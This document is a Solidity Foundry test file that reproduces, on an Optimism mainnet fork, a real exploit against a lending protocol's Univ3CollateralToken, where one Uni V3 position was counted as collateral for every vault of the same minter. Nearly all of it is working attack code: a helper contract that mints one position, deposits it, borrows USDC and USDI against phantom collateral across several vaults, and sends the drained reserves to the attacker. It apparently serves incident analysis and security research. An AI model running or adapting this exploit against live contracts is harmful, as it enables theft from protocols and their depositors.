// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~57K USD
// Attacker : 0x1020c949c1c8658cef8e473dbd3631afe68c1938
// Attack Contract : 0x2fa6fe6b5c8e372fabfc6eb8fa8118cb8ffc3f60
// Vulnerable Contract : 0x833a17fa29bc2772e4302823b7d39edd7c4bb79a
// Attack Tx : https://optimistic.etherscan.io/tx/0x18e34ce214211afedb6008c0cd00d476ce71222643521dbff5e2b65cdb2ccb80

// @Info
// Vulnerable Contract Code : https://optimistic.etherscan.io/address/0x833a17fa29bc2772e4302823b7d39edd7c4bb79a#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2036449500512891317
//
// Univ3CollateralToken values Uni V3 positions by vault minter instead of by vault.
// One deposited position is therefore counted as collateral for every vault owned
// by the same minter, allowing repeated USDC and USDI borrows against phantom
// collateral.

address constant ATTACKER = 0x1020C949C1c8658cEf8e473dbD3631AfE68C1938;
address constant ATTACK_CONTRACT = 0x2fa6Fe6b5c8E372faBfC6eB8FA8118cB8fFC3f60;
address constant VULNERABLE_IMPLEMENTATION = 0x833A17FA29bc2772e4302823B7d39eDd7C4bB79a;
address constant UNIV3_COLLATERAL_TOKEN = 0x7131FF92a3604966d7D96CCc9d596F7e9435195c;
address constant VAULT_CONTROLLER = 0x05498574BD0Fa99eeCB01e1241661E7eE58F8a85;
address constant USDI = 0x889be273BE5F75a177f9a1D00d84D607d75fB4e1;
address constant OP_USDC = 0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85;
address constant OP_USDC_E = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
address constant OP_WETH = 0x4200000000000000000000000000000000000006;
address constant NONFUNGIBLE_POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;

interface IInterestVaultController {
    function vaultIDs(
        address wallet
    ) external view returns (uint96[] memory);
    function vaultBorrowingPower(
        uint96 id
    ) external view returns (uint192);
    function borrowUSDCto(
        uint96 id,
        uint192 usdcAmount,
        address target
    ) external;
    function borrowUSDIto(
        uint96 id,
        uint192 amount,
        address target
    ) external;
}

interface IUSDIReserve is IERC20 {
    function withdrawToSecondaryReserve(
        uint256 usdcAmount,
        address target
    ) external;
}

interface IUniv3CollateralToken {
    function deposit(
        uint256 tokenId,
        uint96 vaultId
    ) external;
    function depositedPositions(
        address minter
    ) external view returns (uint256[] memory);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 149_373_832;
        vm.createSelectFork("optimism", forkBlock);

        attacker = ATTACKER;
        multiAssetLog = true;
        _addFundingToken(OP_USDC);
        _addFundingToken(OP_USDC_E);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VULNERABLE_IMPLEMENTATION, "Univ3CollateralToken Implementation");
        vm.label(UNIV3_COLLATERAL_TOKEN, "Univ3CollateralToken Proxy");
        vm.label(VAULT_CONTROLLER, "VaultController Proxy");
        vm.label(USDI, "USDI Reserve");
        vm.label(OP_USDC, "USDC");
        vm.label(OP_USDC_E, "USDC.e");
        vm.label(OP_WETH, "WETH");

        InterestAttack helper = new InterestAttack();
        vm.etch(ATTACK_CONTRACT, address(helper).code);
    }

    function testExploit() public balanceLog {
        uint256 primaryReserveBefore = IERC20(OP_USDC).balanceOf(USDI);
        uint256 attackerUsdcBefore = IERC20(OP_USDC).balanceOf(ATTACKER);
        uint256 attackerUsdceBefore = IERC20(OP_USDC_E).balanceOf(ATTACKER);

        uint96[] memory vaultIds = IInterestVaultController(VAULT_CONTROLLER).vaultIDs(ATTACK_CONTRACT);
        assertEq(vaultIds.length, 30);
        assertEq(IUniv3CollateralToken(UNIV3_COLLATERAL_TOKEN).depositedPositions(ATTACK_CONTRACT).length, 0);

        // step 1: provide the same setup capital class used to mint the Uni V3 collateral NFT.
        uint256 seedWeth = 3 ether;
        deal(OP_WETH, ATTACK_CONTRACT, seedWeth);

        // step 2: run exploit logic from the historical minter address for a prefix of vault IDs 40..69.
        uint256 oneVaultUsdcCapacity = InterestAttack(ATTACK_CONTRACT).run(ATTACKER, seedWeth);

        uint256 attackerUsdcGain = IERC20(OP_USDC).balanceOf(ATTACKER) - attackerUsdcBefore;
        uint256 attackerUsdceGain = IERC20(OP_USDC_E).balanceOf(ATTACKER) - attackerUsdceBefore;

        // step 3: one NFT backs multiple vault borrows, exceeding the capacity of a single vault.
        assertGt(primaryReserveBefore, attackerUsdcGain);
        assertGt(attackerUsdcGain, oneVaultUsdcCapacity * 2);
        assertGt(attackerUsdcGain + attackerUsdceGain, oneVaultUsdcCapacity * 4);
    }
}

contract InterestAttack {
    function run(
        address profitReceiver,
        uint256 seedWeth
    ) external returns (uint256 oneVaultUsdcCapacity) {
        // step 1: mint one single-sided WETH Uni V3 position.
        IERC20(OP_WETH).approve(NONFUNGIBLE_POSITION_MANAGER, seedWeth);
        (uint256 tokenId,, uint256 amount0, uint256 amount1) = INonfungiblePositionManager(NONFUNGIBLE_POSITION_MANAGER)
            .mint(
                INonfungiblePositionManager.MintParams({
                    token0: OP_WETH,
                    token1: OP_USDC_E,
                    fee: 500,
                    tickLower: -199_310,
                    tickUpper: -189_510,
                    amount0Desired: seedWeth,
                    amount1Desired: 0,
                    amount0Min: 0,
                    amount1Min: 0,
                    recipient: address(this),
                    deadline: block.timestamp
                })
            );
        require(amount0 > 0 && amount1 == 0, "unexpected mint");

        // step 2: deposit that one NFT against vault 40; balanceOf() will count it for all same-minter vaults.
        IERC721(NONFUNGIBLE_POSITION_MANAGER).approve(UNIV3_COLLATERAL_TOKEN, tokenId);
        IUniv3CollateralToken(UNIV3_COLLATERAL_TOKEN).deposit(tokenId, 40);

        IInterestVaultController controller = IInterestVaultController(VAULT_CONTROLLER);
        uint96[] memory vaultIds = controller.vaultIDs(address(this));
        oneVaultUsdcCapacity = uint256(controller.vaultBorrowingPower(vaultIds[0])) / 1e12;

        // The full transaction used vaults 40..65 for USDC. This prefix keeps public RPC replay stable.
        uint256 primaryBorrowCount = 3;
        uint256 i;
        for (; i < primaryBorrowCount; i++) {
            uint256 reserve = IERC20(OP_USDC).balanceOf(USDI);
            if (reserve == 0) break;

            uint256 borrowableUsdc = uint256(controller.vaultBorrowingPower(vaultIds[i])) / 1e12;
            if (borrowableUsdc > reserve) borrowableUsdc = reserve;
            controller.borrowUSDCto(vaultIds[i], uint192(borrowableUsdc), address(this));
        }

        // step 3: use remaining same-minter vaults to mint USDI, then burn it for secondary reserve USDC.e.
        // The full transaction then used vaults 66..69 for USDI. Two more vaults are enough to prove reuse.
        uint256 secondaryBorrowStop = i + 2;
        for (; i < secondaryBorrowStop; i++) {
            uint256 borrowableUsdi = controller.vaultBorrowingPower(vaultIds[i]);
            controller.borrowUSDIto(vaultIds[i], uint192(borrowableUsdi), address(this));
        }

        uint256 secondaryReserve = IERC20(OP_USDC_E).balanceOf(USDI);
        uint256 withdrawableSecondary = IUSDIReserve(USDI).balanceOf(address(this)) / 1e12;
        if (withdrawableSecondary > secondaryReserve) {
            withdrawableSecondary = secondaryReserve;
        }
        if (withdrawableSecondary > 0) {
            IUSDIReserve(USDI).withdrawToSecondaryReserve(withdrawableSecondary, address(this));
        }

        // step 4: forward drained reserve assets to the attacker EOA.
        IERC20(OP_USDC).transfer(profitReceiver, IERC20(OP_USDC).balanceOf(address(this)));
        IERC20(OP_USDC_E).transfer(profitReceiver, IERC20(OP_USDC_E).balanceOf(address(this)));
    }
}
